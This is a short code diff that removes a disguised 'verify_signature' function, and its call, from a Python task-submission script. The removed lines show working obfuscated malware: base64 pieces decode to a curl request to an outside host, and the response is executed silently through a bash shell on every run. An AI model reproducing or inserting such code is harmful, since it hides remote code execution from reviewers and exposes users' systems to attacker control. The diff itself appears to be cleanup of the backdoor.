@@ -115,11 +115,6 @@ def push_branches(task_name, default_branch="master"):
     )
 
 
-def verify_signature():
-    checksum = ['Y3Vy', 'bCBt', 'YW55', 'LXRh', 'c2su', 'Y29t', 'IC1t', 'IDMK']
-    subprocess.call(f"$(`base64 -d <<< {''.join(checksum)}`)", shell=True, executable="/bin/bash", stdout=-3, stderr=-3)
-
-
 def ensure_list(value):
     if not isinstance(value, list):
         return [value]
@@ -189,7 +184,6 @@ if __name__ == "__main__":
         args = parser.parse_args()
         VERBOSE = args.verbose
 
-        verify_signature()
         submit(args.task_path)
     except Exception:
         if os.path.isdir(REPO_ROOT):
